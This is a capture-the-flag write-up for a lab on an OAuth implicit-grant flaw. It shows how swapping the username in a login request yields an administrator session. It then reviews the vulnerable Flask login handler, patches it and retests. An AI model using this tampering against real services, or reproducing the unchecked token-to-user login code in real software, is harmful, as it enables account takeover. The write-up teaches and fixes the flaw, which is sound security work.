---

Name: Implicit
Difficulty: Easy
URL: https://www.hacksmarter.org/events/7f9dc321-77ce-49b8-8acc-5c224ef25d8d/take/implicit-easy
Description: Our engineering team is currently rolling out "HackSmarter ID," a centralized Single Sign-On (SSO) solution designed to provide seamless access across all of our internal platforms. To support lightweight, browser-based applications, the developers have implemented an OAuth-style Implicit Grant flow. You have been contracted to perform a targeted penetration test against this new integration before it goes live to production. Can you log in as the administrator user?

---

# Objective #1: Penetration Test

I started by creating a normal account and inspecting the session cookie.

The session decoded to:

```json
{
    "sso_user": "test",
    "username": "test"
}
```

I then looked at the JavaScript responsible for authentication:

```bash
curl http://implicit.hsm/static/js/auth.js
```

The interesting part was:

```javascript
if (params.access_token && params.username) {
    authenticateWithServer(params.access_token, params.username);
}
```

The JavaScript takes both `access_token` and `username` directly from the URL and sends them to `/api/login`:

```javascript
fetch('/api/login', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        access_token: token,
        username: username
    })
})
```

This suggested that the backend might be trusting the username supplied by the client.

## Intercepting the Login Request

A normal login request looked like this:

```http
POST /api/login HTTP/1.1
Host: implicit.hsm
Content-Type: application/json
Cookie: session=eyJzc29fdXNlciI6InRlc3QifQ...

{"access_token":"50de3f5a004a421a8ec886815a136a17","username":"test"}
```

The important part is that the username is simply a JSON parameter controlled by the client:

```json
{
    "access_token": "50de3f5a004a421a8ec886815a136a17",
    "username": "test"
}
```

I changed only the username:

```json
{
    "access_token": "50de3f5a004a421a8ec886815a136a17",
    "username": "administrator"
}
```

The server responded with:

```http
HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: session=eyJzc29fdXNlciI6InRlc3QiLCJ1c2VybmFtZSI6ImFkbWluaXN0cmF0b3IifQ...

{
  "success": true
}
```

The new session decoded to:

```json
{
    "sso_user": "test",
    "username": "administrator"
}
```

This confirmed that the server was accepting a valid token while allowing the client to choose which username was associated with it.

I replaced my browser's session cookie with the new one and accessed the dashboard.

The application confirmed the successful authentication:

```text
Administrator identity verified via OAuth Implicit Trust override. Lab complete.

HSM{REDACTED}
```

---

# Objective #2: Secure Code Review

The second objective provides access to the application's source code.

I cloned the repository:

```bash
git clone http://implicit.hsm:3000/student/oauth-implicit-lab.git
```

Since `/api/login` was responsible for the vulnerable authentication flow, I searched for that endpoint in `app.py`.

The original implementation was:

```python
@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "message": "Invalid request."}), 400
        
    client_token = data.get('access_token')
    client_username = data.get('username')
    
    # 1. Does the token exist in our system?
    if client_token in valid_tokens:
        session['username'] = client_username
        return jsonify({"success": True})
        
    else:
        return jsonify({"success": False, "message": "Invalid or expired access token."}), 401
```

The problem is here:

```python
if client_token in valid_tokens:
    session['username'] = client_username
```

The application only checks:

> "Is this a valid token?"

It does **not** check:

> "Does this token belong to the username supplied by the client?"

This is exactly what allowed the penetration test exploit to work.

## Fixing the Vulnerability

I modified the function so that the token must also belong to the supplied username:

```python
@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "message": "Invalid request."}), 400
        
    client_token = data.get('access_token')
    client_username = data.get('username')
    
    # 1. Does the token exist in our system?
    if client_token in valid_tokens:
        # 2. Is the token actually associated with this username?
        if valid_tokens[client_token] == client_username:
            session['username'] = client_username
            return jsonify({"success": True})
        else:
            return jsonify({"success": False, "message": "Invalid or expired access token."}), 401

    else:
        return jsonify({"success": False, "message": "Invalid or expired access token."}), 401

```

The important addition is:

```python
if valid_tokens[client_token] == client_username:
```

Now the server verifies both:

1. The access token exists.
2. The access token belongs to the requested username.

## Deploying the Fix

I committed and pushed the change:

```bash
git add app.py
git commit -m "fixed the bug"
git push
```

I then waited for the deployment workflow to finish.

```text
fixed the bug
deploy.yaml #1
:Commit
626ddddf3a
pushed by
student
```

After the deployment completed, I created a new account to make sure the application was still functioning normally.

## Testing the Fix

I captured a normal login request:

```http
POST /api/login HTTP/1.1
Host: implicit.hsm
Content-Type: application/json
Cookie: session=eyJzc29fdXNlciI6InRoZW8ifQ...

{"access_token":"dffa26f58b9f413b9e12bb440006d936","username":"theo"}
```

The token was valid for the `theo` account.

I then attempted the same attack as before by changing only the username:

```json
{
    "access_token": "dffa26f58b9f413b9e12bb440006d936",
    "username": "administrator"
}
```

This time the server rejected the request:

```http
HTTP/1.1 401 UNAUTHORIZED
Content-Type: application/json

{
  "message": "Invalid or expired access token.",
  "success": false
}
```

The exploit no longer worked.

